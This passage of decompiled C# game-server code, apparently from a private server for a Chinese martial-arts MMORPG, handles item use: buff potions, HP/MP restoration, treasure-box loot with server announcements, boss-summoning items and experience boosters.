					追加状态类97 = new 追加状态类(this, num92, 1008001021, 1);
					追加状态列表.Add(追加状态类97.FLD_PID, 追加状态类97);
					base.FLD_人物_追加_气功 += 3;
					base.人物追加最大_HP += 500;
					base.FLD_人物_追加_经验百分比 += 0.4;
					base.FLD_人物_武功攻击力增加百分比 += 0.1;
					base.FLD_人物_武功防御力增加百分比 += 0.1;
					物品使用(num13, num24, 1);
					更新广播人物数据();
					计算人物装备数据();
					更新武功和状态();
					更新经验和历练();
					物品减去属性数量(num, 1);
					更新武功和状态();
					更新广播人物数据();
					更新人物数据(this);
					更新装备效果();
					break;
				}
				case 1000000861:
				{
					int num56 = 600000;
					if (追加状态列表.ContainsKey(1000000861))
					{
						return;
					}
					状态效果(BitConverter.GetBytes(1000000861), 1, num56);
					追加状态类 追加状态类80 = new 追加状态类(this, num56, 1000000861, 1);
					追加状态列表.Add(追加状态类80.FLD_PID, 追加状态类80);
					base.FLD_追加百分比_HP上限 += 0.05;
					更新HP_MP_SP();
					更新武功和状态();
					物品使用(num13, num24, 1);
					break;
				}
				case 1000000862:
					if (人物灵兽 != null && 人物灵兽.FLD_JOB == 5)
					{
						物品使用(num13, num24, 1);
						人物灵兽.FLD_ZCD += 50;
						if (人物灵兽.FLD_ZCD >= 2000)
						{
							人物灵兽.FLD_ZCD = 2000;
						}
						更新灵兽HP_MP_SP();
					}
					return;
				case 1000000899:
				{
					物品类 物品类8 = 得到包裹物品(1000000426);
					if (物品类8 == null || ((物品类8.物品位置 == num24) ? true : false))
					{
						return;
					}
					using (new Lock(World.开箱Lock, "锤子开箱Lock"))
					{
						减去物品(物品类8.物品位置, 1);
						物品使用(num13, num24, 1);
						OpenClass openClass = OpenClass.锤子GetOpen(1000000426);
						if (openClass != null)
						{
							if (World.Itme.TryGetValue(openClass.FLD_PIDX, out var value8))
							{
								int fLD_MAGIC = openClass.FLD_MAGIC1;
								if (value8.FLD_RESIDE2 == 16 && fLD_MAGIC == 0)
								{
									switch (value8.FLD_PID)
									{
									case 800000001:
									case 800000002:
									case 800000011:
									case 800000012:
									case 800000013:
									case 800000023:
									case 800000024:
									case 800000028:
									case 800000030:
									case 800000031:
									case 800000032:
									case 800000033:
									case 800000061:
									case 800000062:
									case 800000071:
									case 800000076:
										fLD_MAGIC = World.GetValue(value8.FLD_PID, 6);
										break;
									}
								}
								AddItemWithProperties(openClass.FLD_PIDX, GetEmptyBagSlot(), openClass.FLD_NUMBER, openClass.FLD_MAGIC1, openClass.FLD_MAGIC2, openClass.FLD_MAGIC3, openClass.FLD_MAGIC4, openClass.FLD_MAGIC5, openClass.FLD_觉醒, openClass.FLD_中级附魂, openClass.FLD_进化, openClass.FLD_BD, openClass.FLD_DAYS);
								if (openClass.是否开启公告 == 1)
								{
									if (World.是否开启公告掉落提示 == 1)
									{
										使用封印宝箱提示信息(物品类8.物品位置, 43);
									}
									else
									{
										string text = "恭喜" + base.UserName + "获得了[" + openClass.FLD_NAME + "]内的[" + openClass.FLD_NAMEX + "]。";
										World.conn.发送("开启宝盒|" + 10 + "|" + text + "|" + World.ServerID);
									}
								}
								RxjhClass.开盒记录(base.Userid, base.UserName, base.人物全服ID, openClass.FLD_PID, openClass.FLD_NAMEX, openClass.FLD_MAGIC1, openClass.FLD_MAGIC2, openClass.FLD_MAGIC3, openClass.FLD_MAGIC4, openClass.FLD_MAGIC5, base.人物坐标_地图, (int)base.人物坐标_X, (int)base.人物坐标_Y, "锤子");
							}
						}
						else
						{
							使用封印宝箱提示信息(物品类8.物品位置, 44);
						}
					}
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1000000008:
				{
					int 位置3 = 0;
					bool flag2 = false;
					if (World.封印宝盒开启 != 1000000899)
					{
						for (int num71 = 0; num71 < 96; num71++)
						{
							if (BitConverter.ToInt32(装备栏包裹[num71].物品ID, 0) == 1008000216 && BitConverter.ToInt32(装备栏包裹[num71].物品数量, 0) >= 1)
							{
								位置3 = num71;
								flag2 = true;
								break;
							}
						}
						if (!flag2)
						{
							系统提示("你背包没有宝藏钥匙", 9, "系统提示");
							return;
						}
					}
					if (flag2)
					{
						减去物品(位置3, 1);
					}
					开箱(封包数据);
					break;
				}
				case 1000000901:
				case 1007000013:
					物品减去属性数量(num24, 1);
					烟花(num49, base.人物全服ID);
					return;
				case 1000000910:
				case 1000000911:
				case 1000000912:
				case 1000000913:
				case 1000000914:
				case 1000000915:
					物品减去属性数量(num24, 1);
					烟花(num49, num36);
					return;
				case 1000000959:
					爆毒状态 = 0.018;
					物品使用(num13, num24, 1);
					爆毒数据包(num24);
					return;
				case 1000000960:
					爆毒状态 = 0.019;
					物品使用(num13, num24, 1);
					爆毒数据包(num24);
					return;
				case 1000000961:
					爆毒状态 = 0.02;
					物品使用(num13, num24, 1);
					爆毒数据包(num24);
					return;
				case 1000000962:
					爆毒状态 = 0.021;
					物品使用(num13, num24, 1);
					爆毒数据包(num24);
					return;
				case 1000000963:
					爆毒状态 = 0.022;
					物品使用(num13, num24, 1);
					爆毒数据包(num24);
					return;
				case 1000001176:
				case 1000001177:
				case 1000001178:
				case 1000001179:
				case 1000001180:
				case 1000001181:
				{
					物品类 物品类7 = 装备栏包裹[num24];
					if (物品类7 != null)
					{
						if (物品类7.Get物品ID != num49 || ((物品类7.物品位置 != num24) ? true : false))
						{
							return;
						}
						byte[] bytes = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
						int num28 = 得到包裹空位(this);
						int num29 = num49 - 6;
						int num30 = num29;
						int num31 = num30;
						if ((uint)(num31 - 1000001170) > 4u && ((num29 != 1000001175) ? true : false))
						{
							return;
						}
						if (num28 != -1)
						{
							增加物品(bytes, BitConverter.GetBytes(num29), num28, BitConverter.GetBytes(1), 物品类7.物品属性);
							物品使用(num13, num24, 1);
						}
						else
						{
							系统提示("背包没有空位请清理一下.", 50, "");
						}
					}
					break;
				}
				case 1007000005:
				{
					if (GetAddState(1007000005) || GetAddState(1007000007) || GetAddState(1007000006))
					{
						系统提示("存在相同的药品！");
						return;
					}
					物品减去属性数量(num24, 1);
					追加状态类 追加状态类44 = new 追加状态类(this, 3600000, num49, 1);
					追加状态列表.Add(追加状态类44.FLD_PID, 追加状态类44);
					base.人物追加最大_HP += 300;
					状态效果(array, 1, 3600000);
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1007000006:
				{
					if (GetAddState(1007000005) || GetAddState(1007000007) || GetAddState(1007000006))
					{
						系统提示("存在相同的药品！");
						return;
					}
					物品减去属性数量(num24, 1);
					追加状态类 追加状态类21 = new 追加状态类(this, 3600000, num49, 1);
					追加状态列表.Add(追加状态类21.FLD_PID, 追加状态类21);
					base.人物追加最大_HP += 500;
					状态效果(array, 1, 3600000);
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1007000007:
				{
					if (GetAddState(1007000007) || GetAddState(1007000006))
					{
						系统提示("存在相同的药品！");
						return;
					}
					物品减去属性数量(num24, 1);
					追加状态类 追加状态类20 = new 追加状态类(this, 86400000, num49, 1);
					追加状态列表.Add(追加状态类20.FLD_PID, 追加状态类20);
					base.人物追加最大_HP += 700;
					状态效果(array, 1, 86400000);
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1007000014:
				{
					if (GetAddState(1007000005) || GetAddState(1007000007) || GetAddState(1007000006) || (GetAddState(1007000014) ? true : false))
					{
						return;
					}
					物品减去属性数量(num24, 1);
					追加状态类 追加状态类96 = new 追加状态类(this, 3600000, num49, 1);
					追加状态列表.Add(追加状态类96.FLD_PID, 追加状态类96);
					base.人物追加最大_HP += 700;
					状态效果(array, 1, 3600000);
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1008000003:
				case 1008000007:
				case 1008000044:
				case 1008000068:
				{
					if (base.人物_HP >= base.人物最大_HP || (((int)DateTime.Now.Subtract(吃药时间).TotalMilliseconds < 100) ? true : false))
					{
						return;
					}
					吃药时间 = DateTime.Now;
					int num101 = base.人物最大_HP - base.人物_HP;
					加血(num101);
					物品使用千年雪参(num24, num101);
					吃药效果(1000000101);
					break;
				}
				case 1008000006:
				case 1008000008:
				case 1008000045:
				case 1008000069:
				{
					if (base.人物_MP >= base.人物最大_MP || (((int)DateTime.Now.Subtract(吃药时间).TotalMilliseconds < 100) ? true : false))
					{
						return;
					}
					吃药时间 = DateTime.Now;
					int num99 = base.人物最大_MP - base.人物_MP;
					加魔(num99);
					物品使用千年雪参(num24, num99);
					吃药效果(1000000104);
					break;
				}
				case 1008000018:
				{
					if (追加状态列表 != null && (GetAddState(1008000018) ? true : false))
					{
						系统提示("存在相同的药品！");
						return;
					}
					物品使用(num13, num24, 1);
					状态效果(BitConverter.GetBytes(1008000018), 1, 3600000);
					追加状态类 追加状态类28 = new 追加状态类(this, 3600000, 1008000018, 1);
					追加状态列表.Add(追加状态类28.FLD_PID, 追加状态类28);
					addFLD_装备_追加_武器_强化(2);
					计算人物装备数据();
					更新武功和状态();
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1008000019:
				{
					if (追加状态列表 != null && (GetAddState(1008000019) ? true : false))
					{
						系统提示("存在相同的药品！");
						return;
					}
					物品使用(num13, num24, 1);
					状态效果(BitConverter.GetBytes(1008000019), 1, 3600000);
					追加状态类 追加状态类106 = new 追加状态类(this, 3600000, 1008000019, 1);
					追加状态列表.Add(追加状态类106.FLD_PID, 追加状态类106);
					addFLD_装备_追加_防具_强化(1);
					计算人物装备数据();
					更新武功和状态();
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1008000053:
					if (GetAddState(1008000053))
					{
						物品减去属性数量(num24, 1);
						追加状态类 追加状态类104 = new 追加状态类(this, 3600000, num49, 1);
						追加状态列表.Add(追加状态类104.FLD_PID, 追加状态类104);
						状态效果(array, 1, 3600000);
						base.FLD_人物_武功攻击力增加百分比 += 0.1;
						更新武功和状态();
						RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					}
					return;
				case 1008000054:
					if (!GetAddState(1008000054))
					{
						物品减去属性数量(num24, 1);
						追加状态类 追加状态类107 = new 追加状态类(this, 3600000, num49, 1);
						追加状态列表.Add(追加状态类107.FLD_PID, 追加状态类107);
						状态效果(array, 1, 3600000);
						base.FLD_人物_武功防御力增加百分比 += 0.1;
						更新武功和状态();
						RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					}
					return;
				case 1008000055:
				{
					if (追加状态列表 != null && (GetAddState(1007000005) || GetAddState(1008000016) || GetAddState(1008000017) || GetAddState(1008000018) || (GetAddState(1008000019) ? true : false)))
					{
						系统提示("存在相同的药品！");
						return;
					}
					int num65 = 3600000;
					物品使用(num13, num24, 1);
					if (GetAddState(1007000005))
					{
						追加状态列表[1007000005].时间结束事件();
					}
					状态效果(BitConverter.GetBytes(1007000005), 1, num65);
					追加状态类 追加状态类89 = new 追加状态类(this, num65, 1007000005, 1);
					追加状态列表.Add(追加状态类89.FLD_PID, 追加状态类89);
					base.人物追加最大_HP += 300;
					if (GetAddState(1008000016))
					{
						追加状态列表[1008000016].时间结束事件();
					}
					状态效果(BitConverter.GetBytes(1008000016), 1, num65);
					追加状态类 追加状态类90 = new 追加状态类(this, num65, 1008000016, 1);
					追加状态列表.Add(追加状态类90.FLD_PID, 追加状态类90);
					addFLD_追加百分比_攻击(0.1);
					if (GetAddState(1008000017))
					{
						追加状态列表[1008000017].时间结束事件();
					}
					状态效果(BitConverter.GetBytes(1008000017), 1, num65);
					追加状态类 追加状态类91 = new 追加状态类(this, num65, 1008000017, 1);
					追加状态列表.Add(追加状态类91.FLD_PID, 追加状态类91);
					addFLD_追加百分比_防御(0.1);
					if (GetAddState(1008000018))
					{
						追加状态列表[1008000018].时间结束事件();
					}
					状态效果(BitConverter.GetBytes(1008000018), 1, num65);
					追加状态类 追加状态类92 = new 追加状态类(this, num65, 1008000018, 1);
					追加状态列表.Add(追加状态类92.FLD_PID, 追加状态类92);
					addFLD_装备_追加_武器_强化(2);
					if (GetAddState(1008000019))
					{
						追加状态列表[1008000019].时间结束事件();
					}
					状态效果(BitConverter.GetBytes(1008000019), 1, num65);
					追加状态类 追加状态类93 = new 追加状态类(this, num65, 1008000019, 1);
					追加状态列表.Add(追加状态类93.FLD_PID, 追加状态类93);
					addFLD_装备_追加_防具_强化(1);
					计算人物装备数据();
					更新武功和状态();
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1008000077:
				{
					if (base.人物_HP >= base.人物最大_HP || (((int)DateTime.Now.Subtract(吃药时间).TotalMilliseconds < 100) ? true : false))
					{
						return;
					}
					吃药时间 = DateTime.Now;
					int num62 = base.人物最大_HP - base.人物_HP;
					加血(num62);
					物品使用无双九转丹(num24, num62);
					吃药效果(1000000101);
					if (GetAddState(1000000775))
					{
						追加状态列表[1000000775].时间结束事件();
					}
					状态效果(BitConverter.GetBytes(1000000775), 1, 10000);
					追加状态类 追加状态类86 = new 追加状态类(this, 10000, 1000000775, 0);
					追加状态列表.Add(追加状态类86.FLD_PID, 追加状态类86);
					base.FLD_人物_追加_防御 += 20;
					更新武功和状态();
					break;
				}
				case 1008000078:
				{
					if (base.人物_MP >= base.人物最大_MP || (((int)DateTime.Now.Subtract(吃药时间).TotalMilliseconds < 100) ? true : false))
					{
						return;
					}
					吃药时间 = DateTime.Now;
					int num54 = base.人物最大_MP - base.人物_MP;
					加魔(num54);
					物品使用无双千年雪参(num24, num54);
					吃药效果(1000000104);
					if (GetAddState(1000000776))
					{
						追加状态列表[1000000776].时间结束事件();
					}
					状态效果(BitConverter.GetBytes(1000000776), 1, 10000);
					追加状态类 追加状态类77 = new 追加状态类(this, 10000, 1000000776, 0);
					追加状态列表.Add(追加状态类77.FLD_PID, 追加状态类77);
					base.FLD_人物_武功攻击力增加百分比 += 0.05;
					base.FLD_人物_武功防御力增加百分比 += 0.1;
					更新武功和状态();
					break;
				}
				case 1008000082:
				{
					if (追加状态列表 != null && (GetAddState(1007000005) || GetAddState(1008000016) || GetAddState(1008000017) || GetAddState(1008000018) || (GetAddState(1008000019) ? true : false)))
					{
						系统提示("存在相同的药品！");
						return;
					}
					int num45 = 86400000;
					物品使用(num13, num24, 1);
					if (GetAddState(1007000005))
					{
						追加状态列表[1007000005].时间结束事件();
					}
					状态效果(BitConverter.GetBytes(1007000005), 1, num45);
					追加状态类 追加状态类52 = new 追加状态类(this, num45, 1007000005, 1);
					追加状态列表.Add(追加状态类52.FLD_PID, 追加状态类52);
					base.人物追加最大_HP += 300;
					if (GetAddState(1008000016))
					{
						追加状态列表[1008000016].时间结束事件();
					}
					状态效果(BitConverter.GetBytes(1008000016), 1, num45);
					追加状态类 追加状态类53 = new 追加状态类(this, num45, 1008000016, 1);
					追加状态列表.Add(追加状态类53.FLD_PID, 追加状态类53);
					addFLD_追加百分比_攻击(0.1);
					if (GetAddState(1008000017))
					{
						追加状态列表[1008000017].时间结束事件();
					}
					int num46;
					状态效果(BitConverter.GetBytes(1008000017), 1, num46 = num45 + 3000);
					追加状态类 追加状态类54 = new 追加状态类(this, num46, 1008000017, 1);
					追加状态列表.Add(追加状态类54.FLD_PID, 追加状态类54);
					addFLD_追加百分比_防御(0.1);
					if (GetAddState(1008000018))
					{
						追加状态列表[1008000018].时间结束事件();
					}
					int num47;
					状态效果(BitConverter.GetBytes(1008000018), 1, num47 = num46 + 3000);
					追加状态类 追加状态类56 = new 追加状态类(this, num47, 1008000018, 1);
					追加状态列表.Add(追加状态类56.FLD_PID, 追加状态类56);
					addFLD_装备_追加_武器_强化(2);
					if (GetAddState(1008000019))
					{
						追加状态列表[1008000019].时间结束事件();
					}
					int 时间2;
					状态效果(BitConverter.GetBytes(1008000019), 1, 时间2 = num47 + 3000);
					追加状态类 追加状态类57 = new 追加状态类(this, 时间2, 1008000019, 1);
					追加状态列表.Add(追加状态类57.FLD_PID, 追加状态类57);
					addFLD_装备_追加_防具_强化(1);
					计算人物装备数据();
					更新武功和状态();
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1008000095:
				case 1008000096:
				case 1008000097:
				case 1008000239:
				case 1008000321:
				case 1008000322:
				case 1008000323:
				case 1008000324:
				case 1008000362:
				case 1008000363:
				{
					if (GetAddState(1008000097) || GetAddState(1008000096) || GetAddState(1008000095) || GetAddState(1008000321) || GetAddState(1008000322) || GetAddState(1008000323) || GetAddState(1008000324) || GetAddState(1008000362) || GetAddState(1008000363) || (GetAddState(1008000239) ? true : false))
					{
						新吃药提示();
						return;
					}
					int num22 = 7200000;
					int num23 = num49;
					int num25 = num23;
					if (num25 == 1008000322 || num25 == 1008000324 || num25 == 1008000363)
					{
						num22 = 86400000;
					}
					追加状态类 追加状态类26 = new 追加状态类(this, num22, num49, 1);
					追加状态列表.Add(追加状态类26.FLD_PID, 追加状态类26);
					状态效果(array, 1, num22);
					switch (num49)
					{
					case 1008000095:
						base.FLD_人物_追加_经验百分比 += 0.2;
						break;
					case 1008000096:
						base.FLD_人物_追加_经验百分比 += 0.3;
						break;
					case 1008000097:
					case 1008000321:
					case 1008000322:
						base.FLD_人物_追加_经验百分比 += 0.4;
						break;
					case 1008000239:
					case 1008000323:
					case 1008000324:
						base.FLD_人物_追加_经验百分比 += 1.0;
						break;
					default:
						base.FLD_人物_追加_经验百分比 += 1.5;
						break;
					}
					int num26;
					switch (num49)
					{
					case 1008000095:
					case 1008000096:
						num26 = 1;
						break;
					case 1008000097:
						num26 = 1;
						break;
					default:
						num26 = ((num49 == 1008000239) ? 1 : 0);
						break;
					}
					if (num26 != 0)
					{
						物品减去属性数量(num24, 1);
					}
					else
					{
						物品使用(num13, num24, 1);
					}
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					return;
				}
				case 1008000110:
					if (安全区禁止下毒(this))
					{
						系统提示("泫勃派安全区禁止使用桃木枝", 10, "系统提示");
						return;
					}
					World.AddNpc飞刀血魔(15516, base.人物坐标_X, base.人物坐标_Y, base.人物坐标_地图);
					World.conn.发送("发送公告|" + 0 + "|飞刀血魔元宝BOSS在" + World.ServerID + "线现身南门, 击杀将有机会获得元宝奖励。");
					World.conn.发送("发送公告|" + 0 + "|飞刀血魔元宝BOSS在" + World.ServerID + "线现身南门, 击杀将有机会获得元宝奖励。");
					World.conn.发送("发送公告|" + 0 + "|飞刀血魔元宝BOSS在" + World.ServerID + "线现身南门, 击杀将有机会获得元宝奖励。");
					物品减去属性数量(num24, 1);
					return;
				case 1008000127:
				case 1008001735:
				{
					if (安全区禁止下毒(this))
					{
						系统提示("泫勃派安全区禁止使用桃木枝", 10, "系统提示");
						return;
					}
					List<botCoord> list = new List<botCoord>();
					foreach (botCoord value32 in World.MonSter.Values)
					{
						if (value32.FLD_PP == 1)
						{
							list.Add(value32);
						}
					}
					int index = new Random().Next(0, list.Count);
					World.AddNpc(list[index].FLD_PID, base.人物坐标_X, base.人物坐标_Y, base.人物坐标_地图);
					物品减去属性数量(num24, 1);
					return;
				}
				case 1008000156:
				{
					if (GetAddState(1008000183) || GetAddState(1008000156) || GetAddState(1008000187) || (GetAddState(1008000195) ? true : false))
					{
						新吃药提示();
						return;
					}
					追加状态类 追加状态类19 = new 追加状态类(this, 864000000, num49, 1);
					追加状态列表.Add(追加状态类19.FLD_PID, 追加状态类19);
					base.人物追加最大_HP += 300;
					更新人物数据(this);
					更新广播人物数据();
					状态效果(array, 1, 864000000);
					物品使用(num13, num24, 1);
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1008000159:
					if (!GetAddState(1008000159) && !GetAddState(1008000160))
					{
						追加状态类 追加状态类11 = new 追加状态类(this, 28800000, num49, 1);
						追加状态列表.Add(追加状态类11.FLD_PID, 追加状态类11);
						状态效果(array, 1, 28800000);
						物品使用(num13, num24, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					}
					return;
				case 1008000160:
					if (!GetAddState(1008000159) && !GetAddState(1008000160))
					{
						追加状态类 追加状态类85 = new 追加状态类(this, 86400000, num49, 1);
						追加状态列表.Add(追加状态类85.FLD_PID, 追加状态类85);
						状态效果(array, 1, 86400000);
						物品使用(num13, num24, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					}
					return;
				case 1008000162:
				case 1008000182:
				{
					if (GetAddState(1008000097) || GetAddState(1008000096) || GetAddState(1008000095) || GetAddState(1008000321) || GetAddState(1008000322) || GetAddState(1008000323) || GetAddState(1008000324) || GetAddState(1008000362) || GetAddState(1008000363) || (GetAddState(1008000239) ? true : false))
					{
						新吃药提示();
						return;
					}
					if (追加状态New列表.Count > 0)
					{
						新吃药提示();
						return;
					}
					int 时间7 = 3600000;
					Set追加状态物品(1, 3600000, 10, 2);
					Set追加状态物品(2, 3600000, 10, 2);
					switch (num49)
					{
					case 1008000162:
						Set追加状态物品(3, 时间7, 300, 1);
						break;
					case 1008000182:
						Set追加状态物品(3, 时间7, 500, 1);
						break;
					default:
						Set追加状态物品(3, 时间7, 700, 1);
						break;
					}
					Set追加状态物品(9, 时间7, 40, 2);
					Set追加状态物品(15, 时间7, 100, 2);
					addFLD_装备_追加_武器_强化(2);
					addFLD_装备_追加_防具_强化(1);
					计算人物装备数据();
					更新武功和状态();
					物品使用(num13, num24, 1);
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1008000163:
					if (追加状态New列表.Count <= 0)
					{
						Set追加状态物品(1, 3600000, 10, 2);
						Set追加状态物品(2, 3600000, 10, 2);
						Set追加状态物品(3, 3600000, 700, 1);
						Set追加状态物品(7, 3600000, 5, 2);
						Set追加状态物品(8, 3600000, 10, 2);
						计算人物装备数据();
						更新武功和状态();
						物品使用(num13, num24, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
						break;
					}
					新吃药提示();
					return;
				case 1008000183:
				{
					if (GetAddState(1008000183) || GetAddState(1008000156) || GetAddState(1008000187) || (GetAddState(1008000195) ? true : false))
					{
						新吃药提示();
						return;
					}
					追加状态类 追加状态类105 = new 追加状态类(this, 864000000, num49, 1);
					追加状态列表.Add(追加状态类105.FLD_PID, 追加状态类105);
					base.人物追加最大_HP += 300;
					addFLD_追加百分比_防御(0.05);
					更新武功和状态();
					更新人物数据(this);
					更新广播人物数据();
					状态效果(array, 1, 864000000);
					物品使用(num13, num24, 1);
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1008000187:
				{
					if (GetAddState(1008000183) || GetAddState(1008000156) || GetAddState(1008000187) || (GetAddState(1008000195) ? true : false))
					{
						新吃药提示();
						return;
					}
					追加状态类 追加状态类102 = new 追加状态类(this, 864000000, num49, 1);
					追加状态列表.Add(追加状态类102.FLD_PID, 追加状态类102);
					base.人物追加最大_HP += 300;
					base.FLD_人物_追加_气功++;
					更新气功();
					更新武功和状态();
					更新人物数据(this);
					更新广播人物数据();
					状态效果(array, 1, 864000000);
					物品使用(num13, num24, 1);
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1008000185:
				{
					if (追加状态列表.ContainsKey(1008000185))
					{
						新吃药提示();
						return;
					}
					追加状态类 追加状态类101 = new 追加状态类(this, 3600000, num49, 1);
					追加状态列表.Add(追加状态类101.FLD_PID, 追加状态类101);
					base.人物追加最大_HP += 700;
					base.FLD_人物_追加_经验百分比 += 0.4;
					base.FLD_人物_追加_历练百分比 += 2.0;
					addFLD_追加百分比_防御(0.1);
					addFLD_装备_追加_防具_强化(1);
					addFLD_装备_追加_武器_强化(2);
					状态效果(array, 1, 3600000);
					物品使用(num13, num24, 1);
					计算人物装备数据();
					更新武功和状态();
					更新HP_MP_SP();
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1008000197:
				{
					if (追加状态列表.ContainsKey(1008000197))
					{
						新吃药提示();
						return;
					}
					追加状态类 追加状态类98 = new 追加状态类(this, 3600000, num49, 1);
					追加状态列表.Add(追加状态类98.FLD_PID, 追加状态类98);
					base.人物追加最大_HP += 700;
					addFLD_追加百分比_防御(0.1);
					addFLD_追加百分比_攻击(0.1);
					base.FLD_人物_武功攻击力增加百分比 += 0.05;
					base.FLD_人物_武功防御力增加百分比 += 0.1;
					base.药品减免对方伤害 += 30;
					addFLD_装备_追加_防具_强化(1);
					addFLD_装备_追加_武器_强化(2);
					状态效果(array, 1, 3600000);
					物品使用(num13, num24, 1);
					计算人物装备数据();
					更新武功和状态();
					更新HP_MP_SP();
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1008000188:
				{
					if (GetAddState(1008000188))
					{
						新吃药提示();
						return;
					}
					追加状态类 追加状态类95 = new 追加状态类(this, 14400000, num49, 1);
					追加状态列表.Add(追加状态类95.FLD_PID, 追加状态类95);
					addFLD_追加百分比_攻击(0.15);
					addFLD_追加百分比_防御(0.15);
					base.人物追加最大_HP += 300;
					base.人物追加最大_MP += 300;
					base.FLD_人物_追加_经验百分比 += 0.1;
					更新武功和状态();
					更新人物数据(this);
					更新广播人物数据();
					状态效果(array, 1, 14400000);
					物品使用(num13, num24, 1);
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1008000194:
				{
					if (追加状态列表.ContainsKey(1008000194))
					{
						return;
					}
					追加状态类 追加状态类94 = new 追加状态类(this, 7200000, num49, 1);
					追加状态列表.Add(追加状态类94.FLD_PID, 追加状态类94);
					base.人物追加最大_HP += 1000;
					addFLD_追加百分比_攻击(0.15);
					addFLD_追加百分比_防御(0.15);
					base.FLD_人物_追加_经验百分比 += 0.4;
					base.FLD_人物_武功攻击力增加百分比 += 0.1;
					base.FLD_人物_武功防御力增加百分比 += 0.1;
					状态效果(array, 1, 7200000);
					物品减去属性数量(num24, 1);
					更新人物数据(this);
					更新武功和状态();
					break;
				}
				case 1008000195:
					if (!追加状态列表.ContainsKey(1008000156) && !追加状态列表.ContainsKey(1008000187) && !追加状态列表.ContainsKey(1008000183) && !追加状态列表.ContainsKey(1008000195))
					{
						追加状态类 追加状态类88 = new 追加状态类(this, 864000000, num49, 1);
						追加状态列表.Add(追加状态类88.FLD_PID, 追加状态类88);
						base.人物追加最大_HP += 300;
						base.FLD_人物_追加_气功++;
						addFLD_追加百分比_防御(0.05);
						状态效果(array, 1, 864000000);
						物品使用(num13, num24, 1);
						更新人物数据(this);
						更新武功和状态();
						更新广播人物数据();
					}
					break;
				case 1008000212:
					if (追加状态New列表.Count > 0)
					{
						新吃药提示();
						return;
					}
					Set追加状态物品(1, 7200000, 20, 2);
					Set追加状态物品(7, 7200000, 15, 2);
					Set追加状态物品(6, 7200000, 20, 1);
					Set追加状态物品(14, 7200000, 2, 1);
					计算人物装备数据();
					更新武功和状态();
					物品减去属性数量(num24, 1);
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					return;
				case 1008000213:
					if (追加状态New列表.Count > 0)
					{
						新吃药提示();
						return;
					}
					Set追加状态物品(2, 7200000, 20, 2);
					Set追加状态物品(8, 7200000, 10, 2);
					Set追加状态物品(5, 7200000, 20, 1);
					Set追加状态物品(3, 7200000, 500, 1);
					Set追加状态物品(9, 7200000, 20, 2);
					计算人物装备数据();
					更新武功和状态();
					物品减去属性数量(num24, 1);
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				case 1008000216:
				{
					物品类 物品类9 = 得到包裹物品(1000000426);
					if (物品类9 == null || ((物品类9.物品位置 == num24) ? true : false))
					{
						return;
					}
					using (new Lock(World.开箱Lock, "钥匙开箱Lock"))
					{
						减去物品(物品类9.物品位置, 1);
						物品使用(num13, num24, 1);
						OpenClass openClass2 = OpenClass.钥匙GetOpen(1000000426);
						if (openClass2 != null)
						{
							if (World.Itme.TryGetValue(openClass2.FLD_PIDX, out var value11))
							{
								int fLD_MAGIC2 = openClass2.FLD_MAGIC1;
								if (value11.FLD_RESIDE2 == 16 && fLD_MAGIC2 == 0)
								{
									switch (value11.FLD_PID)
									{
									case 800000001:
									case 800000002:
									case 800000011:
									case 800000012:
									case 800000013:
									case 800000023:
									case 800000024:
									case 800000028:
									case 800000030:
									case 800000031:
									case 800000032:
									case 800000033:
									case 800000061:
									case 800000062:
									case 800000071:
									case 800000076:
										fLD_MAGIC2 = World.GetValue(value11.FLD_PID, 6);
										break;
									}
								}
								AddItemWithProperties(openClass2.FLD_PIDX, GetEmptyBagSlot(), openClass2.FLD_NUMBER, openClass2.FLD_MAGIC1, openClass2.FLD_MAGIC2, openClass2.FLD_MAGIC3, openClass2.FLD_MAGIC4, openClass2.FLD_MAGIC5, openClass2.FLD_觉醒, openClass2.FLD_中级附魂, openClass2.FLD_进化, openClass2.FLD_BD, openClass2.FLD_DAYS);
								if (openClass2.是否开启公告 == 1)
								{
									if (World.是否开启公告掉落提示 == 1)
									{
										使用封印宝箱提示信息(物品类9.物品位置, 43);
									}
									else
									{
										string text2 = "恭喜" + base.UserName + "获得了[" + openClass2.FLD_NAME + "]内的[" + openClass2.FLD_NAMEX + "]。";
										World.conn.发送("开启宝盒|" + 10 + "|" + text2 + "|" + World.ServerID);
									}
								}
